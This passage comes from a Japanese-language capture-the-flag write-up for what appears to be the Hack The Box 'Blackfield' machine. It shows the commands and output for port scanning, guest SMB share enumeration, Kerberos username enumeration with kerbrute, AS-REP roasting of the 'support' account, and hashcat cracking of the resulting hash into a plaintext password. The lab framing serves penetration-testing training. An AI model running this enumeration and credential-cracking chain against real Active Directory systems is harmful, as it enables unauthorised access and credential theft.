## STEP 1
```sh
└─$ rustscan -a 10.129.194.101 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.194.101:53
Open 10.129.194.101:88
Open 10.129.194.101:135
Open 10.129.194.101:389
Open 10.129.194.101:445
Open 10.129.194.101:593
Open 10.129.194.101:3268
Open 10.129.194.101:5985
10.129.194.101 -> [53,88,135,389,445,593,3268,5985]
```

## STEP 2
guestでsmb列挙成功  
profile$にread権限があったが、314個のフォルダは確認できたがファイルは何一つ確認されなかった
```sh
└─$ netexec smb 10.129.194.101 -u ' ' -p '' -M spider_plus
SMB         10.129.194.101  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
SMB         10.129.194.101  445    DC01             [+] BLACKFIELD.local\ : (Guest)
SPIDER_PLUS 10.129.194.101  445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.194.101  445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.194.101  445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.194.101  445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.194.101  445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.194.101  445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.194.101  445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.194.101  445    DC01             [*] Enumerated shares
SMB         10.129.194.101  445    DC01             Share           Permissions     Remark
SMB         10.129.194.101  445    DC01             -----           -----------     ------
SMB         10.129.194.101  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.194.101  445    DC01             C$                              Default share
SMB         10.129.194.101  445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.194.101  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.194.101  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.194.101  445    DC01             profiles$       READ            
SMB         10.129.194.101  445    DC01             SYSVOL                          Logon server share 
SPIDER_PLUS 10.129.194.101  445    DC01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.194.101.json".
SPIDER_PLUS 10.129.194.101  445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, forensic, IPC$, NETLOGON, profiles$, SYSVOL)
SPIDER_PLUS 10.129.194.101  445    DC01             [*] SMB Readable Shares:  2 (IPC$, profiles$)
SPIDER_PLUS 10.129.194.101  445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.194.101  445    DC01             [*] Total folders found:  314
SPIDER_PLUS 10.129.194.101  445    DC01             [*] Total files found:    0
                                                                                                                                                                                                                     
└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.194.101.json 
{
    "profiles$": {}
}
```
フォルダ名を確認すると、ユーザ名っぽい
```sh
└─$ smbclient -N -c 'ls' //10.129.194.101/profiles$ | awk '{print $1}' > users.txt

└─$ head users.txt 
.
..
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
ACheretei
ACsonaki
```
もしかしたらユーザプロファイルがsmb共有されているかも  
ということで、profile$内のフォルダ名と同じユーザ名を探索、３つ発見した
```sh
└─$ ./kerbrute_linux_amd64 userenum --dc 10.129.194.101 -d 'BLACKFIELD.local' users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/17/25 - Ronnie Flathers @ropnop

2025/10/17 09:28:27 >  Using KDC(s):
2025/10/17 09:28:27 >   10.129.194.101:88

2025/10/17 09:28:52 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.local
2025/10/17 09:31:09 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2025/10/17 09:31:10 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.local
2025/10/17 09:31:44 >  Done! Tested 314 usernames (3 valid) in 196.094 seconds
```
有効なユーザ名の中で、supportがasreproastingできた
```sh
└─$ cat user.txt
audit2020
support
svc_backup

└─$ netexec ldap 10.129.194.101 -u user.txt -p '' --asreproast asreproast.txt 
LDAP        10.129.194.101  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)mv 
LDAP        10.129.194.101  389    DC01             $krb5asrep$23$support@BLACKFIELD.LOCAL:f32ca361a3a484daa399ca9f525d0b89$86578269ef5fca41779ecac41f4fd6d1387033b9903c8d15b3706520528fcc8d5c9dfe07259b8576b80842301e99cac69a501265f8713dccf7b348316c7386c210e4aa13052f7668f8c81cb08eaf5b3381e52fb8fa6cdf5f3b326a39666b169acdfc4188830ea4071078e182f6e780d947c1182a309bd92b86f392f3e38be0fac2d9185a02203610e2caf556b48684f7836bf1fbdc43f40a05accd0f78532d4bf1d35946fa033ba9dba73acd1485eed1a5a8273b9af1b1b36f7086d9401409f9cf47df28ba809eff447d257c37202bdfcf5936e3616661129b5990cfb3389bd1278aa920235ab5a83d4e0342ea807c70f05ffeb6
```
クラック成功！  
supportのパスワードは、#00^BlackKnight
```sh
└─$ name-that-hash -f asreproast.txt --no-banner 

$krb5asrep$23$support@BLACKFIELD.LOCAL:f32ca361a3a484daa399ca9f525d0b89$86578269ef5fca41779ecac41f4fd6d1387033b9903c8d15b3706520528fcc8d5c9dfe07259b8576b80842301e99cac69a501265f8713dccf7b348316c7386c210e4aa13052f7668f8c81cb08eaf5b3381e5
2fb8fa6cdf5f3b326a39666b169acdfc4188830ea4071078e182f6e780d947c1182a309bd92b86f392f3e38be0fac2d9185a02203610e2caf556b48684f7836bf1fbdc43f40a05accd0f78532d4bf1d35946fa033ba9dba73acd1485eed1a5a8273b9af1b1b36f7086d9401409f9cf47df28ba809eff
447d257c37202bdfcf5936e3616661129b5990cfb3389bd1278aa920235ab5a83d4e0342ea807c70f05ffeb6

Most Likely 
Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active Directory

└─$ hashcat -a 0 -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt --quite     
$krb5asrep$23$support@BLACKFIELD.LOCAL:f32ca361a3a484daa399ca9f525d0b89$86578269ef5fca41779ecac41f4fd6d1387033b9903c8d15b3706520528fcc8d5c9dfe07259b8576b80842301e99cac69a501265f8713dccf7b348316c7386c210e4aa13052f7668f8c81cb08eaf5b3381e52fb8fa6cdf5f3b326a39666b169acdfc4188830ea4071078e182f6e780d947c1182a309bd92b86f392f3e38be0fac2d9185a02203610e2caf556b48684f7836bf1fbdc43f40a05accd0f78532d4bf1d35946fa033ba9dba73acd1485eed1a5a8273b9af1b1b36f7086d9401409f9cf47df28ba809eff447d257c37202bdfcf5936e3616661129b5990cfb3389bd1278aa920235ab5a83d4e0342ea807c70f05ffeb6:#00^BlackKnight
```
